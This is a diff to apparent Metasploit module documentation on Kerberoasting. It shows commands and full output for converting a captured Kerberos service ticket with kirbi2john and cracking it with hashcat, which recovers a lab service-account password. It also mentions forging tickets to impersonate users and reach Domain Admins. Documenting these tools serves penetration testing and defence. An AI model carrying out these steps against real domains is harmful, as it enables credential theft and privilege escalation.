@@ -1,3 +1,4 @@
+
 ## Vulnerable Application
 
 Any system leveraging kerberos as a means of authentication e.g. Active Directory, MSSQL
@@ -197,21 +198,125 @@ MDAwMA==
 
 ### Crack Service Tickets
 
-To crack the service ticket a number of tools can be used. In this example we'll use a python
-script **tgsrepcrack** is part of [Tim Medin](https://twitter.com/TimMedin) [Kerberoast](https://github.com/nidem/kerberoast) toolkit
+To crack the service ticket a number of tools can be used. In this example we'll use hashcat. First we need to convert
+the ticket we retrieved in the `.kirbi` format to a format parsable by hashcat. The script **kirbi2john** is part of
+[Tim Medin](https://twitter.com/TimMedin) [Kerberoast](https://github.com/nidem/kerberoast) toolkit is perfect for
+this task. 
+
+First clone the repo then run the script against the `.kirbi` file. 
+```
+msfuser@ubuntu:~/git$ git clone https://github.com/nidem/kerberoast.git
+msfuser@ubuntu:~/git$ cd kerberoast
+msfuser@ubuntu:~/git/kerberoast$ python3 kirbi2john.py ~/1-40a10000-Administrator@HTTP~testService-EXAMPLE.COM.kirbi
+$krb5tgs$23$*1-40a10000-Administrator@HTTP~testService-EXAMPLE.COM*$2b5cda0496cdd9cfb11a00a9b03a0d31$76975a9115860927140
+3a1808746b35d0e99159553e3c81a9cd32a51e968a4b45ce3fcf08e5eac8d4551df10c9f1bd4572cc273d1bd154fc8fd1228d55cd39a90b64ec3117f
+e0a1fb496d1be4042ccb2998d998fa3de8f50bcb04d3bf78e34be07d71310a3be829e24cb75c398847f960aefe9669534df26344beb6e7bbe628b7ac
+fa957c4a67417546fc441b84aaee78a0e5256cc9dead287327ac7907af71e02b142027c9061515c72ef03c842d0f73754f9dffa434a26057df4c4434
+71cd5bf76260469ea6f1c367a64ea02b01a2b9c2b83979911fc58fa8822c70877b72370078e3d7955fc2ade02acd2a803889a8c3a609f80f9beb45c0
+981aba6bdbb208fa6ea2cc91814c8c4dd6e9287f4ef3b9e2b7febe07648c78ec25137e82bee0d99290a33fd3701953bd858fac15c6d1652f11cc75a6
+e419cab7dec019e599eda3a76652475968bc2845fa6f02477efaecfd63e58fad817f1976adeda14b2c4c1508a84df1813e05368c3e07c9f656d5730d
+848b86c59bf576f4c2505375b7d6934abf8a955b1a71d802026383cbd9005bf12f0664ffc25ebee8aef4b574dd93850d59fc16c5f9881e9b4f957c33
+74724e4046c0fa4bc5ff16b9a960b4b6a2ede25bb18c617c2dbcfb3fd34a4cc3ee29fb0f6e6f43722ffc50ceddce55b2be1a53361d13c983980d3191
+86c7dbd124a3c8f19560e88d0d858b0f5320738931bf2f32c1e893fbbadb92f7574128f6f36a0acab99023f79d857f15f0920a1a76b3a97e6282d4e6
+c5ef30206444bc20da1a7d89d1007a97e75ffb9554cfeaf6757919a635dbdfcfd74d2eec8d5f83f109beb6e653a8c0e787ec039c7bb93d07a60e8bb4
+b56d026e809a80e020875a3a382b367f28c0e41714bd5ef97da578956cba12ab1fbcd84a5313d2edc5f7c601c3c56860a347ab013f50e3f8e6167935
+9db05e4014db38e21a814fe002ba14d17840aa053bbec3a6aadec31db50827168d24107486d373567c2969215c0decf639bc46b9968e43a79bc6f261
+2544feb09908118615035f630e37b03cb04d9725d2085a28543575d91c361bf1b6a61837d6c34c8961df33d1b8b45963bf361d33e0ca2fa37b40e62b
+6389ebb0ad4097036f4d6aa4598086313ea79d68f75301d5038783567c2fdcf25e2b459acdc867c64613fe84f3faf1fdb79fc6e05322b2175eec3b2e
+84e3a8165f0af265d3ccd994712704516f0c78f76dd7c5c98f8fc8b9db1231f19c259bc7f078a86d4bc6cf06b8c4158dc41f48dd51b146d3fc63d2fd
+f057e6644f838a944de0679ab3e8c6290d4d8004bd53570f61323eeb7c910c6546880a508172bf4ee2fa1c87748ec0e2e2f79e03e963affb593f1391
+a62fdf2f29b792b1c0e7ece2645381a4284b56ddc525c842589eca39efa0466418c9bfb60df479015f4fac86d38575aad1f29674a12d873f8fc12415
+b6ea7b2cb15c9d422f0f904a6af518f12c4e0e362093d8d33a47672973f6d70e80669666f37d6674ef8e2999c92fa38b5de8e266716bb182527bde17
+36bcb926a6340ae92f8b338be2fe5fa3a757894679beba5b296fe0cdc11100b9a536264cb5e3cb3c6d0426acaa7dd3928895d32973fab2698d17fff4
+f9f1ecd02102f5bbd222b039ca3e30fed4003be6b70b2e492c8ea5eee92439681d6af767547609a87d47b68ba7ca62dbe3e4bf74e081915ab15e4103
+8839b74263ddbd087c90b6262dd5684e078068c28ccc0c115e3
+tickets written: 1
+```
+
+Copy the above hash to a file called hash.txt.
+
+Ensure hashcat is installed: `msfuser@ubuntu:~/git/kerberoast$ sudo apt install hashcat`
+
+With a word list of your choice run the following command: 
 
 ```
-➜  kerberoast git:(master) ✗ python3 tgsrepcrack.py passlist.txt 1-40a10000-Administrator@HTTP\~testService-EXAMPLE.COM.kirbi
-Cracking 1 tickets...
-found password for ticket 0: N0tpassword!  File: 1-40a10000-Administrator@HTTP~testService-EXAMPLE.COM.kirbi
-Successfully cracked all tickets
+msfuser@ubuntu:~/git/kerberoast$ hashcat -m 13100 --force -a 0 hash.txt wordlist.txt
+hashcat (v5.1.0) starting...
+
+OpenCL Platform #1: The pocl project
+====================================
+* Device #1: pthread-Intel(R) Core(TM) i7-9750H CPU @ 2.60GHz, 16384/41063 MB allocatable, 6MCU
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+ATTENTION! Pure (unoptimized) OpenCL kernels selected.
+This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.
+If you want to switch to optimized OpenCL kernels, append -O to your commandline.
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64
+ -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3
+ -D DGST_ELEM=4 -D KERN_TYPE=13100 -D _unroll'
+ 
+* Device #1: Kernel m13100_a0-pure.64a04b9e.kernel not found in cache! Building may take a while...
+Dictionary cache built:
+* Filename..: wordlist.txt
+* Passwords.: 3
+* Bytes.....: 33
+* Keyspace..: 3
+* Runtime...: 0 secs
+
+The wordlist or mask that you are using is too small.
+This means that hashcat cannot use the full parallel power of your device(s).
+Unless you supply more work, your cracking speed will drop.
+For tips on supplying more work, see: https://hashcat.net/faq/morework
+
+Approaching final keyspace - workload adjusted.
+
+$krb5tgs$23$*1-40a10000-Administrator@HTTP~testService-EXAMPLE.COM*$2b5cda0496cdd9cfb11a00a9b03a0d31$76975a9115860927140
+<truncated due to size>
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Type........: Kerberos 5 TGS-REP etype 23
+Hash.Target......: $krb5tgs$23$*1-40a10000-Administrator@HTTP~testServ...c115e3
+Time.Started.....: Tue Jan 10 07:41:11 2023 (0 secs)
+Time.Estimated...: Tue Jan 10 07:41:11 2023 (0 secs)
+Guess.Base.......: File (wordlist.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:       26 H/s (0.03ms) @ Accel:32 Loops:1 Thr:64 Vec:8
+Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
+Progress.........: 3/3 (100.00%)
+Rejected.........: 0/3 (0.00%)
+Candidates.1.....: test123  -> N0tpassword!
+```
+
+If you want to view the hash + cracked password at a later date run the above command with `--show` appended.
+```
+msfuser@ubuntu:~/git/kerberoast$ hashcat -m 13100 --force -a 0 hash.txt wordlist.txt --show
+$krb5tgs$23$*1-40a10000-Administrator@HTTP~testService-EXAMPLE.COM*$2b5cda0496cdd9cfb11a00a9b03a0d31$76975a9115860927140
+<truncated due to size>
+39efa046757894679beba5b296fe0cdc11100b9a536264cb5e3cb3c6d0426acaa7dd3928895d32973fab2695476093ddbd087c115e3:N0tpassword!
 ```
 
 ### Rewrite Service Tickets & RAM Injection
 
 Kerberos tickets are signed with the NTLM hash of the password. If the ticket hash has been cracked then it is possible
-to rewrite the ticket with [Kerberoast](https://github.com/nidem/kerberoast) python script. This tactic will allow to
-impersonate any domain user or a fake account when the service is going to be accessed. Additionally privilege
+to rewrite the ticket with [Kerberoast](https://github.com/nidem/kerberoast) python script. This tactic will allow users
+to impersonate any domain user or a fake account when the service is going to be accessed. Additionally privilege
 escalation is also possible as the user can be added into an elevated group such as Domain Admins.
 
 ```
